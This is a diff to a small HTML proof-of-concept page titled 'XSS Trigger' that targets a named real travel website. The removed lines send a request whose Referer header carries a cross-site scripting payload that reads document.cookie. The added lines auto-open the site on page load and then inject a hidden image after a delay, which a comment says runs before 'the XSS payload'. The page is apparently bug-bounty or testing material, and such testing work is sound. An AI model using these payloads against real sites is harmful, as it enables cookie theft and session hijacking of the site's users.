@@ -4,15 +4,21 @@
     <title>XSS Trigger</title>
 </head>
 <body>
-    <a href="javascript:void(0);" id="xssLink">Click me</a>
+    <a href="http://travelpirates.hometogo.com/" id="redirectLink" target="_blank">Click me to Redirect</a>
 
     <script>
-    document.getElementById("xssLink").addEventListener("click", function() {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://travelpirates.hometogo.com/account/><", true);
-        xhr.setRequestHeader("Referer", 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss');
-        xhr.send();
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("redirectLink").click();
     });
+    
+    // Add a delay to ensure the redirect happens before the XSS payload
+    setTimeout(function() {
+        var img = new Image();
+        img.src = "http://travelpirates.hometogo.com/";
+        img.setAttribute("style", "display:none;");
+        img.setAttribute("referrerpolicy", "no-referrer");
+        document.body.appendChild(img);
+    }, 5000);
     </script>
 </body>
 </html>
